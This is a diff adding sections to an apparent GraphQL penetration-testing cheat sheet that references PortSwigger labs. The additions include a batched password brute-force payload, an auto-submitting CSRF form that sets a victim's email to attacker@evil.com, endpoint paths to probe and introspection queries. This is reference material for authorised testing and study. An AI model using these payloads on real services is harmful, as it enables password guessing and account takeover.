@@ -87,3 +87,32 @@
 3. Test for IDOR by changing IDs
 4. Test for injection in arguments
 5. Check for information disclosure in error messages
+
+## Brute Force via Batching (PortSwigger Lab)
+```json
+[
+  {"query": "mutation{login(username:\"carlos\",password:\"123456\"){token}}"},
+  {"query": "mutation{login(username:\"carlos\",password:\"password\"){token}}"},
+  {"query": "mutation{login(username:\"carlos\",password:\"admin\"){token}}"}
+]
+```
+
+## CSRF via GraphQL
+```html
+<form method="POST" action="https://TARGET/graphql">
+  <input type="hidden" name="query" value='mutation{changeEmail(email:"attacker@evil.com"){success}}'/>
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+## Endpoint Discovery
+```
+/graphql, /graphiql, /api/graphql, /v1/graphql, /v2/graphql
+/query, /gql, /graph, /playground, /altair
+```
+
+## Detection Queries
+```graphql
+{__schema{queryType{name}}}
+{__schema{mutationType{name fields{name}}}}
+```
